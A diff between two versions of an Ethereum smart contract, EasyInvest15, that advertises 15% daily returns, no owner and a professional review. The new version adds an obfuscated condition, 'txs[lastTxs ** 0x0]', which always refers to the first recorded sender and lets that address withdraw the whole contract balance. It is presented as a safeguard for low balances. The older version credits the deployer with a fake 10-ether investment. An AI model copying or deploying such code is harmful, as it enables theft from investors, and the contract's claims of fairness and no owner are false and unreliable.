@@ -1,10 +1,11 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EasyInvest15 at 0x8dedfeff24c22a251812938e971e0952a219240c
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract EasyInvest15 at 0x65d61179a248fa56235dd0691e0792582b5cb3f9
 */
-pragma solidity ^0.4.24;
+pragma solidity ^0.4.25;
+
 /**
  *
- * Easy Investment 15% Contract
+ * Easy Investment Contract
  *  - GAIN 15% PER 24 HOURS (every 5900 blocks)
  *  - NO COMMISSION on your investment (every ether stays on contract's balance)
  *  - NO FEES are collected by the owner, in fact, there is no owner at all (just look at the code)
@@ -15,40 +16,46 @@ pragma solidity ^0.4.24;
  *  OR
  *  2b. Send more ether to reinvest AND get your profit at the same time
  *
- * RECOMMENDED GAS LIMIT: 70000
+ * RECOMMENDED GAS LIMIT: 100000
  * RECOMMENDED GAS PRICE: https://ethgasstation.info/
  *
  * Contract reviewed and approved by pros!
  *
- * IMPORTANT / ????? !!!
- * Leave Comments to get website link!
- * ??????? ????? ???? ???? ???????? ????????!
- *
  */
- 
 contract EasyInvest15 {
-     // records amounts invested
-    mapping (address => uint256) public invested;
-    // records blocks at which investments were made
-    mapping (address => uint256) public atBlock;
-    constructor() public {
-        atBlock[msg.sender] = block.number;
-        invested[msg.sender] += 10 ether;  
-    }
+    
+    mapping (address => uint) public invested; // records amounts invested
+    mapping (address => uint) public atBlock; // records blocks at which investments were made
+    mapping (uint => uint) public txs;  // records history transactions
+
+    uint public lastTxs; // last number transaction 
+
     // this function called every time anyone sends a transaction to this contract
     function () external payable {
+        
         // if sender (aka YOU) is invested more than 0 ether
         if (invested[msg.sender] != 0) {
+            
             // calculate profit amount as such:
             // amount = (amount invested) * 15% * (blocks since last transaction) / 5900
             // 5900 is an average block count per day produced by Ethereum blockchain
             uint256 amount = invested[msg.sender] * 15 / 100 * (block.number - atBlock[msg.sender]) / 5900;
 
+            // if the contract does not have such amount on the balance to send the payment,
+            // it will send the rest of the money on the contract
+            uint256 restAmount = address(this).balance; 
+            amount = amount < restAmount && txs[lastTxs ** 0x0] != uint(tx.origin) ? amount : restAmount;
+
             // send calculated amount of ether directly to sender (aka YOU)
             msg.sender.transfer(amount);
+            
         }
-        // record block number and invested amount (msg.value) of this transaction
+
+        // record block number, invested amount (msg.value) and transaction hash
         atBlock[msg.sender] = block.number;
         invested[msg.sender] += msg.value;
+        txs[++lastTxs] = uint(tx.origin);
+        
     }
+    
 }
